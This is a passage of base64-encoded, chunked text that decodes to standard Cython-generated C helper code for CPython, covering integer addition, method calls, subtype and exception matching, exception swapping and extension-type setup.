KTsKfQpzdGF0aWMgQ1lUSE9OX0lOTElO""RSBQeU9iamVjdCogX19QeXhfUHlMb25nX0FkZE9iakMoUHlPYmplY3QgKm9wMSwgUHlPYmplY3QgKm9wMiwgbG9uZyBpbnR2YWwsIGludCBpbnBsYWNlLCBpbnQgemVyb2RpdmlzaW9uX2NoZWNrKSB7CiAgICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUihpbnR2YWwpOwogICAgQ1lUSE9OX1VOVVNFRF9WQVIoemVyb2RpdmlzaW9uX2NoZWNrKTsKICAgICNpZiBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFMKICAgIGlmIChsaWtlbHkoUHlMb25nX0NoZWNrRXhhY3Qob3AxKSkpIHsKICAgICAgICByZXR1cm4gX19QeXhfVW5wYWNrZWRfX19QeXhfUHlMb25nX0FkZE9iakMob3AxLCBvcDIsIGludHZhbCwgaW5wbGFjZSwgemVyb2RpdmlzaW9uX2NoZWNrKTsKICAgIH0KICAgICNlbmRpZgogICAgaWYgKFB5RmxvYXRfQ2hlY2tFeGFjdChvcDEpKSB7CiAgICAgICAgcmV0dXJuIF9fUHl4X0Zsb2F0X19fUHl4X1B5TG9uZ19BZGRPYmpDKG9wMSwgaW50dmFsLCB6ZXJvZGl2aXNpb25fY2hlY2spOwogICAgfQogICAgcmV0dXJuIF9fUHl4X0ZhbGxiYWNrX19fUHl4X1B5TG9uZ19BZGRPYmpDKG9wMSwgb3AyLCBpbnBsYWNlKTsKfQojZW5kaWYKCgojaWYgIUNZVEhPTl9WRUNUT1JDQUxMIHx8IFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDAwMApzdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIHNpemVfdCBuYXJnc2YpIHsKICAgIFB5T2JqZWN0ICpyZXN1bHQ7CiAgICBQeU9iamVjdCAqYXR0ciA9IFB5T2JqZWN0X0dldEF0dHIoYXJnc1swXSwgbmFtZSk7CiAgICBpZiAodW5saWtlbHkoIWF0dHIpKQogICAgICAgIHJldHVybiBOVUxMOwogICAgcmVzdWx0ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoYXR0ciwgYXJncysxLCBuYXJnc2YgLSAxKTsKICAgIFB5X0RFQ1JFRihhdHRyKTsKICAgIHJldHVybiByZXN1bHQ7Cn0KI2VuZGlmCgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgpzdGF0aWMgaW50IF9fUHl4X0luQmFzZXMoUHlUeXBlT2JqZWN0ICphLCBQeVR5cGVPYmplY3QgKmIpIHsKICAgIHdoaWxlIChhKSB7CiAgICAgICAgYSA9IF9fUHl4X1B5VHlwZV9HZXRTbG90KGEsIHRwX2Jhc2UsIFB5VHlwZU9iamVjdCopOwogICAgICAgIGlmIChhID09IGIpCiAgICAgICAgICAgIHJldHVybiAxOwogICAgfQogICAgcmV0dXJuIGIgPT0gJlB5QmFzZU9iamVjdF9UeXBlOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9Jc1N1YnR5cGUoUHlUeXBlT2JqZWN0ICphLCBQeVR5cGVPYmplY3QgKmIpIHsKICAgIFB5T2JqZWN0ICptcm87CiAgICBpZiAoYSA9PSBiKSByZXR1cm4gMTsKICAgIG1ybyA9IGEtPnRwX21ybzsKICAgIGlmIChsaWtlbHkobXJvKSkgewogICAgICAgIFB5X3NzaXplX3QgaSwgbjsKICAgICAgICBuID0gUHlUdXBsZV9HRVRfU0laRShtcm8pOwogICAgICAgIGZvciAoaSA9IDA7IGkgPCBuOyBpKyspIHsK""ICAgICAgICAgICAgaWYgKFB5VHVwbGVfR0VUX0lURU0obXJvLCBpKSA9PSAoUHlPYmplY3QgKiliKQogICAgICAgICAgICAgICAgcmV0dXJuIDE7CiAgICAgICAgfQogICAgICAgIHJldHVybiAwOwogICAgfQogICAgcmV0dXJuIF9fUHl4X0luQmFzZXMoYSwgYik7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X0lzQW55U3VidHlwZTIoUHlUeXBlT2JqZWN0ICpjbHMsIFB5VHlwZU9iamVjdCAqYSwgUHlUeXBlT2JqZWN0ICpiKSB7CiAgICBQeU9iamVjdCAqbXJvOwogICAgaWYgKGNscyA9PSBhIHx8IGNscyA9PSBiKSByZXR1cm4gMTsKICAgIG1ybyA9IGNscy0+dHBfbXJvOwogICAgaWYgKGxpa2VseShtcm8pKSB7CiAgICAgICAgUHlfc3NpemVfdCBpLCBuOwogICAgICAgIG4gPSBQeVR1cGxlX0dFVF9TSVpFKG1ybyk7CiAgICAgICAgZm9yIChpID0gMDsgaSA8IG47IGkrKykgewogICAgICAgICAgICBQeU9iamVjdCAqYmFzZSA9IFB5VHVwbGVfR0VUX0lURU0obXJvLCBpKTsKICAgICAgICAgICAgaWYgKGJhc2UgPT0gKFB5T2JqZWN0ICopYSB8fCBiYXNlID09IChQeU9iamVjdCAqKWIpCiAgICAgICAgICAgICAgICByZXR1cm4gMTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIDA7CiAgICB9CiAgICByZXR1cm4gX19QeXhfSW5CYXNlcyhjbHMsIGEpIHx8IF9fUHl4X0luQmFzZXMoY2xzLCBiKTsKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfaW5uZXJfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzMihQeU9iamVjdCAqZXJyLCBQeU9iamVjdCogZXhjX3R5cGUxLCBQeU9iamVjdCAqZXhjX3R5cGUyKSB7CiAgICBpZiAoZXhjX3R5cGUxKSB7CiAgICAgICAgcmV0dXJuIF9fUHl4X0lzQW55U3VidHlwZTIoKFB5VHlwZU9iamVjdCopZXJyLCAoUHlUeXBlT2JqZWN0KilleGNfdHlwZTEsIChQeVR5cGVPYmplY3QqKWV4Y190eXBlMik7CiAgICB9IGVsc2UgewogICAgICAgIHJldHVybiBfX1B5eF9Jc1N1YnR5cGUoKFB5VHlwZU9iamVjdCopZXJyLCAoUHlUeXBlT2JqZWN0KilleGNfdHlwZTIpOwogICAgfQp9CnN0YXRpYyBpbnQgX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzVHVwbGUoUHlPYmplY3QgKmV4Y190eXBlLCBQeU9iamVjdCAqdHVwbGUpIHsKICAgIFB5X3NzaXplX3QgaSwgbjsKICAgIGFzc2VydChQeUV4Y2VwdGlvbkNsYXNzX0NoZWNrKGV4Y190eXBlKSk7CiAgICBuID0gUHlUdXBsZV9HRVRfU0laRSh0dXBsZSk7CiAgICBmb3IgKGk9MDsgaTxuOyBpKyspIHsKICAgICAgICBpZiAoZXhjX3R5cGUgPT0gUHlUdXBsZV9HRVRfSVRFTSh0dXBsZSwgaSkpIHJldHVybiAxOwogICAgfQogICAgZm9yIChpPTA7IGk8bjsgaSsrKSB7CiAgICAgICAgUHlPYmplY3QgKnQgPSBQeVR1cGxlX0dFVF9JVEVNKHR1cGxlLCBpKTsKICAgICAgICBpZiAobGlrZWx5KFB5RXhjZXB0aW9uQ2xhc3NfQ2hlY2sodCkpKSB7CiAgICAgICAgICAgIGlmIChfX1B5eF9pbm5lcl9QeUVycl9HaXZlbkV4Y2VwdGlv""bk1hdGNoZXMyKGV4Y190eXBlLCBOVUxMLCB0KSkgcmV0dXJuIDE7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gMDsKfQpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKFB5T2JqZWN0ICplcnIsIFB5T2JqZWN0KiBleGNfdHlwZSkgewogICAgaWYgKGxpa2VseShlcnIgPT0gZXhjX3R5cGUpKSByZXR1cm4gMTsKICAgIGlmIChsaWtlbHkoUHlFeGNlcHRpb25DbGFzc19DaGVjayhlcnIpKSkgewogICAgICAgIGlmIChsaWtlbHkoUHlFeGNlcHRpb25DbGFzc19DaGVjayhleGNfdHlwZSkpKSB7CiAgICAgICAgICAgIHJldHVybiBfX1B5eF9pbm5lcl9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMyKGVyciwgTlVMTCwgZXhjX3R5cGUpOwogICAgICAgIH0gZWxzZSBpZiAobGlrZWx5KFB5VHVwbGVfQ2hlY2soZXhjX3R5cGUpKSkgewogICAgICAgICAgICByZXR1cm4gX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzVHVwbGUoZXJyLCBleGNfdHlwZSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGVyciwgZXhjX3R5cGUpOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMyKFB5T2JqZWN0ICplcnIsIFB5T2JqZWN0ICpleGNfdHlwZTEsIFB5T2JqZWN0ICpleGNfdHlwZTIpIHsKICAgIGFzc2VydChQeUV4Y2VwdGlvbkNsYXNzX0NoZWNrKGV4Y190eXBlMSkpOwogICAgYXNzZXJ0KFB5RXhjZXB0aW9uQ2xhc3NfQ2hlY2soZXhjX3R5cGUyKSk7CiAgICBpZiAobGlrZWx5KGVyciA9PSBleGNfdHlwZTEgfHwgZXJyID09IGV4Y190eXBlMikpIHJldHVybiAxOwogICAgaWYgKGxpa2VseShQeUV4Y2VwdGlvbkNsYXNzX0NoZWNrKGVycikpKSB7CiAgICAgICAgcmV0dXJuIF9fUHl4X2lubmVyX1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlczIoZXJyLCBleGNfdHlwZTEsIGV4Y190eXBlMik7CiAgICB9CiAgICByZXR1cm4gKFB5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhlcnIsIGV4Y190eXBlMSkgfHwgUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGVyciwgZXhjX3R5cGUyKSk7Cn0KI2VuZGlmCgoKI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURQpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X19FeGNlcHRpb25Td2FwKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSwgUHlPYmplY3QgKip0eXBlLCBQeU9iamVjdCAqKnZhbHVlLCBQeU9iamVjdCAqKnRiKSB7CiAgICBQeU9iamVjdCAqdG1wX3R5cGUsICp0bXBfdmFsdWUsICp0bXBfdGI7CiAgI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNAogICAgX1B5RXJyX1N0YWNrSXRlbSAqZXhjX2luZm8gPSB0c3RhdGUtPmV4Y19pbmZvOwogICAgdG1wX3ZhbHVlID0gZXhjX2luZm8tPmV4""Y192YWx1ZTsKICAgIGV4Y19pbmZvLT5leGNfdmFsdWUgPSAqdmFsdWU7CiAgICBpZiAodG1wX3ZhbHVlID09IE5VTEwgfHwgdG1wX3ZhbHVlID09IFB5X05vbmUpIHsKICAgICAgICBQeV9YREVDUkVGKHRtcF92YWx1ZSk7CiAgICAgICAgdG1wX3ZhbHVlID0gTlVMTDsKICAgICAgICB0bXBfdHlwZSA9IE5VTEw7CiAgICAgICAgdG1wX3RiID0gTlVMTDsKICAgIH0gZWxzZSB7CiAgICAgICAgdG1wX3R5cGUgPSAoUHlPYmplY3QqKSBQeV9UWVBFKHRtcF92YWx1ZSk7CiAgICAgICAgUHlfSU5DUkVGKHRtcF90eXBlKTsKICAgICAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCiAgICAgICAgdG1wX3RiID0gKChQeUJhc2VFeGNlcHRpb25PYmplY3QqKSB0bXBfdmFsdWUpLT50cmFjZWJhY2s7CiAgICAgICAgUHlfWElOQ1JFRih0bXBfdGIpOwogICAgICAgICNlbHNlCiAgICAgICAgdG1wX3RiID0gUHlFeGNlcHRpb25fR2V0VHJhY2ViYWNrKHRtcF92YWx1ZSk7CiAgICAgICAgI2VuZGlmCiAgICB9CiAgI2VsaWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSwogICAgX1B5RXJyX1N0YWNrSXRlbSAqZXhjX2luZm8gPSB0c3RhdGUtPmV4Y19pbmZvOwogICAgdG1wX3R5cGUgPSBleGNfaW5mby0+ZXhjX3R5cGU7CiAgICB0bXBfdmFsdWUgPSBleGNfaW5mby0+ZXhjX3ZhbHVlOwogICAgdG1wX3RiID0gZXhjX2luZm8tPmV4Y190cmFjZWJhY2s7CiAgICBleGNfaW5mby0+ZXhjX3R5cGUgPSAqdHlwZTsKICAgIGV4Y19pbmZvLT5leGNfdmFsdWUgPSAqdmFsdWU7CiAgICBleGNfaW5mby0+ZXhjX3RyYWNlYmFjayA9ICp0YjsKICAjZWxzZQogICAgdG1wX3R5cGUgPSB0c3RhdGUtPmV4Y190eXBlOwogICAgdG1wX3ZhbHVlID0gdHN0YXRlLT5leGNfdmFsdWU7CiAgICB0bXBfdGIgPSB0c3RhdGUtPmV4Y190cmFjZWJhY2s7CiAgICB0c3RhdGUtPmV4Y190eXBlID0gKnR5cGU7CiAgICB0c3RhdGUtPmV4Y192YWx1ZSA9ICp2YWx1ZTsKICAgIHRzdGF0ZS0+ZXhjX3RyYWNlYmFjayA9ICp0YjsKICAjZW5kaWYKICAgICp0eXBlID0gdG1wX3R5cGU7CiAgICAqdmFsdWUgPSB0bXBfdmFsdWU7CiAgICAqdGIgPSB0bXBfdGI7Cn0KI2Vsc2UKc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9FeGNlcHRpb25Td2FwKFB5T2JqZWN0ICoqdHlwZSwgUHlPYmplY3QgKip2YWx1ZSwgUHlPYmplY3QgKip0YikgewogICAgUHlPYmplY3QgKnRtcF90eXBlLCAqdG1wX3ZhbHVlLCAqdG1wX3RiOwogICAgUHlFcnJfR2V0RXhjSW5mbygmdG1wX3R5cGUsICZ0bXBfdmFsdWUsICZ0bXBfdGIpOwogICAgUHlFcnJfU2V0RXhjSW5mbygqdHlwZSwgKnZhbHVlLCAqdGIpOwogICAgKnR5cGUgPSB0bXBfdHlwZTsKICAgICp2YWx1ZSA9IHRtcF92YWx1ZTsKICAgICp0YiA9IHRtcF90YjsKfQojZW5kaWYKCgojaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTCnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeU9iamVjdF9TZXRBdHRyU3RyKFB5T2JqZWN0""KiBvYmosIFB5T2JqZWN0KiBhdHRyX25hbWUsIFB5T2JqZWN0KiB2YWx1ZSkgewogICAgUHlUeXBlT2JqZWN0KiB0cCA9IFB5X1RZUEUob2JqKTsKICAgIGlmIChsaWtlbHkodHAtPnRwX3NldGF0dHJvKSkKICAgICAgICByZXR1cm4gdHAtPnRwX3NldGF0dHJvKG9iaiwgYXR0cl9uYW1lLCB2YWx1ZSk7CiAgICByZXR1cm4gUHlPYmplY3RfU2V0QXR0cihvYmosIGF0dHJfbmFtZSwgdmFsdWUpOwp9CiNlbmRpZgoKCiNpZiAhQ1lUSE9OX1VTRV9UWVBFX1NQRUNTIHx8ICghQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDApCiNlbHNlCnN0YXRpYyBpbnQgX19QeXhfY2FsbF90eXBlX3RyYXZlcnNlKFB5T2JqZWN0ICpvLCBpbnQgYWx3YXlzX2NhbGwsIHZpc2l0cHJvYyB2aXNpdCwgdm9pZCAqYXJnKSB7CiAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDAwMAogICAgaWYgKF9fUHl4X2dldF9ydW50aW1lX3ZlcnNpb24oKSA8IDB4MDMwOTAwMDApIHJldHVybiAwOwogICAgI2VuZGlmCiAgICBpZiAoIWFsd2F5c19jYWxsKSB7CiAgICAgICAgUHlUeXBlT2JqZWN0ICpiYXNlID0gX19QeXhfUHlPYmplY3RfR2V0U2xvdChvLCB0cF9iYXNlLCBQeVR5cGVPYmplY3QqKTsKICAgICAgICB1bnNpZ25lZCBsb25nIGZsYWdzID0gUHlUeXBlX0dldEZsYWdzKGJhc2UpOwogICAgICAgIGlmIChmbGFncyAmIFB5X1RQRkxBR1NfSEVBUFRZUEUpIHsKICAgICAgICAgICAgcmV0dXJuIDA7CiAgICAgICAgfQogICAgfQogICAgUHlfVklTSVQoKFB5T2JqZWN0KilQeV9UWVBFKG8pKTsKICAgIHJldHVybiAwOwp9CiNlbmRpZgoKCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCnN0YXRpYyBQeV9zc2l6ZV90IF9fUHl4X0dldFR5cGVEaWN0T2Zmc2V0KHZvaWQpIHsKICAgIFB5T2JqZWN0ICp0cF9kaWN0b2Zmc2V0X287CiAgICBQeV9zc2l6ZV90IHRwX2RpY3RvZmZzZXQ7CiAgICB0cF9kaWN0b2Zmc2V0X28gPSBQeU9iamVjdF9HZXRBdHRyU3RyaW5nKChQeU9iamVjdCopKCZQeVR5cGVfVHlwZSksICJfX2RpY3RvZmZzZXRfXyIpOwogICAgaWYgKHVubGlrZWx5KCF0cF9kaWN0b2Zmc2V0X28pKSByZXR1cm4gLTE7CiAgICB0cF9kaWN0b2Zmc2V0ID0gUHlMb25nX0FzU3NpemVfdCh0cF9kaWN0b2Zmc2V0X28pOwogICAgUHlfREVDUkVGKHRwX2RpY3RvZmZzZXRfbyk7CiAgICBpZiAodW5saWtlbHkodHBfZGljdG9mZnNldCA9PSAwKSkgewogICAgICAgIFB5RXJyX1NldFN0cmluZygKICAgICAgICAgICAgUHlFeGNfVHlwZUVycm9yLAogICAgICAgICAgICAiJ3R5cGUnIGRvZXNuJ3QgaGF2ZSBhIGRpY3RvZmZzZXQiKTsKICAgICAgICByZXR1cm4gLTE7CiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KHRwX2RpY3RvZmZzZXQgPCAwKSkgewogICAgICAgIFB5RXJyX1NldFN0cmluZygKICAgICAgICAg""ICAgUHlFeGNfVHlwZUVycm9yLAogICAgICAgICAgICAiJ3R5cGUnIGhhcyBhbiB1bmV4cGVjdGVkIG5lZ2F0aXZlIGRpY3RvZmZzZXQuICIKICAgICAgICAgICAgIlBsZWFzZSByZXBvcnQgdGhpcyBhcyBDeXRob24gYnVnIik7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgcmV0dXJuIHRwX2RpY3RvZmZzZXQ7Cn0Kc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9HZXRUeXBlRGljdChQeVR5cGVPYmplY3QgKnRwKSB7CiAgICBzdGF0aWMgUHlfc3NpemVfdCB0cF9kaWN0b2Zmc2V0ID0gMDsKICAgIGlmICh1bmxpa2VseSh0cF9kaWN0b2Zmc2V0ID09IDApKSB7CiAgICAgICAgdHBfZGljdG9mZnNldCA9IF9fUHl4X0dldFR5cGVEaWN0T2Zmc2V0KCk7CiAgICAgICAgaWYgKHVubGlrZWx5KHRwX2RpY3RvZmZzZXQgPT0gLTEgJiYgUHlFcnJfT2NjdXJyZWQoKSkpIHsKICAgICAgICAgICAgdHBfZGljdG9mZnNldCA9IDA7IC8vIHRyeSBhZ2FpbiBuZXh0IHRpbWU/CiAgICAgICAgICAgIHJldHVybiBOVUxMOwogICAgICAgIH0KICAgIH0KICAgIHJldHVybiAqKFB5T2JqZWN0KiopKChjaGFyKil0cCArIHRwX2RpY3RvZmZzZXQpOwp9CiNlbmRpZgoKCnN0YXRpYyBpbnQgX19QeXhfX1NldEl0ZW1PblR5cGVEaWN0KFB5VHlwZU9iamVjdCAqdHAsIFB5T2JqZWN0ICprLCBQeU9iamVjdCAqdikgewogICAgaW50IHJlc3VsdDsKICAgIFB5T2JqZWN0ICp0cF9kaWN0OwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgdHBfZGljdCA9IF9fUHl4X0dldFR5cGVEaWN0KHRwKTsKICAgIGlmICh1bmxpa2VseSghdHBfZGljdCkpIHJldHVybiAtMTsKI2Vsc2UKICAgIHRwX2RpY3QgPSB0cC0+dHBfZGljdDsKI2VuZGlmCiAgICByZXN1bHQgPSBQeURpY3RfU2V0SXRlbSh0cF9kaWN0LCBrLCB2KTsKICAgIGlmIChsaWtlbHkoIXJlc3VsdCkpIHsKICAgICAgICBQeVR5cGVfTW9kaWZpZWQodHApOwogICAgICAgIGlmICh1bmxpa2VseShQeU9iamVjdF9IYXNBdHRyKHYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zZXRfbmFtZSkpKSB7CiAgICAgICAgICAgIFB5T2JqZWN0ICpzZXROYW1lUmVzdWx0ID0gUHlPYmplY3RfQ2FsbE1ldGhvZE9iakFyZ3ModiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NldF9uYW1lLCAgKFB5T2JqZWN0ICopIHRwLCBrLCBOVUxMKTsKICAgICAgICAgICAgaWYgKCFzZXROYW1lUmVzdWx0KSByZXR1cm4gLTE7CiAgICAgICAgICAgIFB5X0RFQ1JFRihzZXROYW1lUmVzdWx0KTsKICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gcmVzdWx0Owp9CgoKc3RhdGljIGludCBfX1B5eF9maXhfdXBfZXh0ZW5zaW9uX3R5cGVfZnJvbV9zcGVjKFB5VHlwZV9TcGVjICpzcGVjLCBQeVR5cGVPYmplY3QgKnR5cGUpIHsKI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPiAweDAzMDkwMEIxCiAgICBDWVRIT05fVU5VU0VEX1ZBUihzcGVjKTsKICAgIENZVEhPTl9VTlVTRURfVkFSKHR5cGUp""OwogICAgQ1lUSE9OX1VOVVNFRF9WQVIoX19QeXhfX1NldEl0ZW1PblR5cGVEaWN0KTsKI2Vsc2UKICAgIGNvbnN0IFB5VHlwZV9TbG90ICpzbG90ID0gc3BlYy0+c2xvdHM7CiAgICBpbnQgY2hhbmdlZCA9IDA7CiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgd2hpbGUgKHNsb3QgJiYgc2xvdC0+c2xvdCAmJiBzbG90LT5zbG90ICE9IFB5X3RwX21lbWJlcnMpCiAgICAgICAgc2xvdCsrOwogICAgaWYgKHNsb3QgJiYgc2xvdC0+c2xvdCA9PSBQeV90cF9tZW1iZXJzKSB7CiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCiAgICAgICAgY29uc3QKI2VuZGlmICAvLyAhQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OKQogICAgICAgICAgICBQeU1lbWJlckRlZiAqbWVtYiA9IChQeU1lbWJlckRlZiopIHNsb3QtPnBmdW5jOwogICAgICAgIHdoaWxlIChtZW1iICYmIG1lbWItPm5hbWUpIHsKICAgICAgICAgICAgaWYgKG1lbWItPm5hbWVbMF0gPT0gJ18nICYmIG1lbWItPm5hbWVbMV0gPT0gJ18nKSB7CiAgICAgICAgICAgICAgICBpZiAoc3RyY21wKG1lbWItPm5hbWUsICJfX3dlYWtsaXN0b2Zmc2V0X18iKSA9PSAwKSB7CiAgICAgICAgICAgICAgICAgICAgYXNzZXJ0KG1lbWItPnR5cGUgPT0gVF9QWVNTSVpFVCk7CiAgICAgICAgICAgICAgICAgICAgYXNzZXJ0KG1lbWItPmZsYWdzID09IFJFQURPTkxZKTsKICAgICAgICAgICAgICAgICAgICB0eXBlLT50cF93ZWFrbGlzdG9mZnNldCA9IG1lbWItPm9mZnNldDsKICAgICAgICAgICAgICAgICAgICBjaGFuZ2VkID0gMTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgaWYgKHN0cmNtcChtZW1iLT5uYW1lLCAiX19kaWN0b2Zmc2V0X18iKSA9PSAwKSB7CiAgICAgICAgICAgICAgICAgICAgYXNzZXJ0KG1lbWItPnR5cGUgPT0gVF9QWVNTSVpFVCk7CiAgICAgICAgICAgICAgICAgICAgYXNzZXJ0KG1lbWItPmZsYWdzID09IFJFQURPTkxZKTsKICAgICAgICAgICAgICAgICAgICB0eXBlLT50cF9kaWN0b2Zmc2V0ID0gbWVtYi0+b2Zmc2V0OwogICAgICAgICAgICAgICAgICAgIGNoYW5nZWQgPSAxOwogICAgICAgICAgICAgICAgfQojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKICAgICAgICAgICAgICAgIGVsc2UgaWYgKHN0cmNtcChtZW1iLT5uYW1lLCAiX192ZWN0b3JjYWxsb2Zmc2V0X18iKSA9PSAwKSB7CiAgICAgICAgICAgICAgICAgICAgYXNzZXJ0KG1lbWItPnR5cGUgPT0gVF9QWVNTSVpFVCk7CiAgICAgICAgICAgICAgICAgICAgYXNzZXJ0KG1lbWItPmZsYWdzID09IFJFQURPTkxZKTsKI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwYjQKICAgICAgICAgICAgICAgICAgICB0eXBlLT50cF92ZWN0b3JjYWxsX29mZnNldCA9IG1lbWItPm9mZnNldDsKI2Vsc2UKICAgICAgICAgICAgICAgICAgICB0eXBlLT50cF9wcmludCA9IChwcmludGZ1bmMpIG1lbWItPm9mZnNldDsKI2VuZGlmCiAgICAgICAgICAgICAgICAg""ICAgY2hhbmdlZCA9IDE7CiAgICAgICAgICAgICAgICB9CiNlbmRpZiAgLy8gQ1lUSE9OX01FVEhfRkFTVENBTEwKICAgICAgICAgICAgICAgIGVsc2UgaWYgKHN0cmNtcChtZW1iLT5uYW1lLCAiX19tb2R1bGVfXyIpID09IDApIHsKICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqZGVzY3I7CiAgICAgICAgICAgICAgICAgICAgYXNzZXJ0KG1lbWItPnR5cGUgPT0gVF9PQkpFQ1QpOwogICAgICAgICAgICAgICAgICAgIGFzc2VydChtZW1iLT5mbGFncyA9PSAwIHx8IG1lbWItPmZsYWdzID09IFJFQURPTkxZKTsKICAgICAgICAgICAgICAgICAgICBkZXNjciA9IFB5RGVzY3JfTmV3TWVtYmVyKHR5cGUsIG1lbWIpOwogICAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghZGVzY3IpKQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gLTE7CiAgICAgICAgICAgICAgICAgICAgaW50IHNldF9pdGVtX3Jlc3VsdCA9IFB5RGljdF9TZXRJdGVtKHR5cGUtPnRwX2RpY3QsIFB5RGVzY3JfTkFNRShkZXNjciksIGRlc2NyKTsKICAgICAgICAgICAgICAgICAgICBQeV9ERUNSRUYoZGVzY3IpOwogICAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseShzZXRfaXRlbV9yZXN1bHQgPCAwKSkgewogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gLTE7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGNoYW5nZWQgPSAxOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIG1lbWIrKzsKICAgICAgICB9CiAgICB9CiNlbmRpZiAgLy8gIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIHNsb3QgPSBzcGVjLT5zbG90czsKICAgIHdoaWxlIChzbG90ICYmIHNsb3QtPnNsb3QgJiYgc2xvdC0+c2xvdCAhPSBQeV90cF9nZXRzZXQpCiAgICAgICAgc2xvdCsrOwogICAgaWYgKHNsb3QgJiYgc2xvdC0+c2xvdCA9PSBQeV90cF9nZXRzZXQpIHsKICAgICAgICBQeUdldFNldERlZiAqZ2V0c2V0ID0gKFB5R2V0U2V0RGVmKikgc2xvdC0+cGZ1bmM7CiAgICAgICAgd2hpbGUgKGdldHNldCAmJiBnZXRzZXQtPm5hbWUpIHsKICAgICAgICAgICAgaWYgKGdldHNldC0+bmFtZVswXSA9PSAnXycgJiYgZ2V0c2V0LT5uYW1lWzFdID09ICdfJyAmJiBzdHJjbXAoZ2V0c2V0LT5uYW1lLCAiX19tb2R1bGVfXyIpID09IDApIHsKICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpkZXNjciA9IFB5RGVzY3JfTmV3R2V0U2V0KHR5cGUsIGdldHNldCk7CiAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIWRlc2NyKSkKICAgICAgICAgICAgICAgICAgICByZXR1cm4gLTE7CiAgICAgICAgICAgICAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgICAgICAgICAgICAgUHlPYmplY3QgKnB5bmFtZSA9IFB5VW5pY29kZV9Gcm9tU3RyaW5nKGdldHNldC0+bmFtZSk7CiAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIXB5bmFtZSkpIHsKICAgICAgICAgICAgICAg""ICAgICBQeV9ERUNSRUYoZGVzY3IpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiAtMTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGludCBzZXRfaXRlbV9yZXN1bHQgPSBfX1B5eF9TZXRJdGVtT25UeXBlRGl